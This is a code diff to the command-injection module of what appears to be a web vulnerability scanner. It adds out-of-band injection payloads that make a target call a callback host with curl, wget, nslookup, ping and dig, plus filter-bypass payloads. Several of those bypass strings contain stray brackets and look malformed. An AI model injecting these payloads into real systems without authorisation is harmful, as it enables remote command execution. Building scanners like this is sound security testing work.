@@ -1,7 +1,9 @@
 import re
+import asyncio
 from modules.base import BaseModule
 from core.utils import extract_params, random_string
 from core.http import inject_param
+
 
 class CmdiModule(BaseModule):
     name = "cmdi"
@@ -25,16 +27,99 @@ class CmdiModule(BaseModule):
     
     async def scan(self, target):
         self.findings = []
+        self.oob_manager = self.config.get("oob_manager")
         params = extract_params(target)
         
         if params:
             await self._test_basic_injection(target, params)
             await self._test_blind_injection(target, params)
+            
+            if self.oob_manager:
+                await self._test_blind_oob_injection(target, params)
+            
+            if self.aggressive:
+                await self._test_encoded_injection(target, params)
+                await self._test_filter_bypass(target, params)
         
         return self.findings
     
+    async def _test_blind_oob_injection(self, target, params):
+        token = self.oob_manager.generate_token()
+        http_callback = self.oob_manager.get_http_url(token)
+        dns_callback = self.oob_manager.get_dns_payload(token)
+        
+        oob_payloads = [
+            (f";curl {http_callback}", "curl"),
+            (f"|curl {http_callback}", "curl"),
+            (f"`curl {http_callback}`", "curl"),
+            (f"$(curl {http_callback})", "curl"),
+            (f";wget {http_callback}", "wget"),
+            (f"|wget {http_callback}", "wget"),
+            (f";nslookup {dns_callback}", "nslookup"),
+            (f"|nslookup {dns_callback}", "nslookup"),
+            (f"`nslookup {dns_callback}`", "nslookup"),
+            (f"$(nslookup {dns_callback})", "nslookup"),
+            (f";ping -c 1 {dns_callback}", "ping"),
+            (f"|ping -c 1 {dns_callback}", "ping"),
+            (f"& ping -n 1 {dns_callback} &", "ping"),
+            (f";host {dns_callback}", "host"),
+            (f"|dig {dns_callback}", "dig"),
+        ]
+        
+        for param in params:
+            for payload, cmd_type in oob_payloads:
+                await self.test_param(target, param, payload)
+        
+        await asyncio.sleep(3)
+        
+        interactions = self.oob_manager.check_interactions(token)
+        if interactions:
+            interaction = interactions[0]
+            self.add_finding(
+                "CRITICAL",
+                f"Blind Command Injection CONFIRMED via OOB",
+                url=target,
+                evidence=f"Callback received: {interaction.get('type')} from {interaction.get('source_ip', 'unknown')}",
+                confidence_evidence=["oob_callback_received", "blind_cmdi_confirmed", "rce_verified"],
+                request_data={"method": "GET", "url": target, "callback_type": interaction.get('type')}
+            )
+            return True
+        return False
+    
+    async def _test_filter_bypass(self, target, params):
+        bypass_payloads = [
+            (";i]d", "Bracket insertion"),
+            (";i''d", "Quote insertion"),
+            (";i\"\"d", "Double quote insertion"),
+            (";$()i]d", "Nested command"),
+            (";{id,}", "Brace expansion"),
+            (";\nid", "Newline injection"),
+            (";\rid", "Carriage return"),
+            (";id\x00", "Null byte"),
+            (";/???/??n/id", "Wildcard path"),
+            (";/???/b]i]n/id", "Wildcard + bracket"),
+        ]
+        
+        for param in params:
+            for payload, bypass_type in bypass_payloads:
+                resp = await self.test_param(target, param, payload)
+                if resp.get("status"):
+                    for pattern in self.success_patterns:
+                        if re.search(pattern, resp.get("text", ""), re.IGNORECASE):
+                            self.add_finding(
+                                "CRITICAL",
+                                f"Command Injection (filter bypass: {bypass_type})",
+                                url=target,
+                                parameter=param,
+                                evidence=f"Bypass: {bypass_type}",
+                                confidence_evidence=["filter_bypass", "cmdi_confirmed"],
+                                request_data={"method": "GET", "url": target, "param": param, "payload": payload}
+                            )
+                            return
+    
     async def _test_basic_injection(self, target, params):
-        payloads = [
+        file_payloads = self.get_payloads("cmdi")
+        base = [
             (";id", "id"),
             ("|id", "id"),
             ("||id", "id"),
@@ -54,7 +139,8 @@ class CmdiModule(BaseModule):
             ("|dir", "dir"),
             ("&type c:\\windows\\win.ini", "type"),
         ]
-        
+        extra = [(p, "id") for p in (file_payloads or []) if p and len(p) < 200]
+        payloads = list(dict.fromkeys([(a, b) for a, b in base] + extra))[:80]
         for param in params:
             for payload, cmd_type in payloads:
                 resp = await self.test_param(target, param, payload)
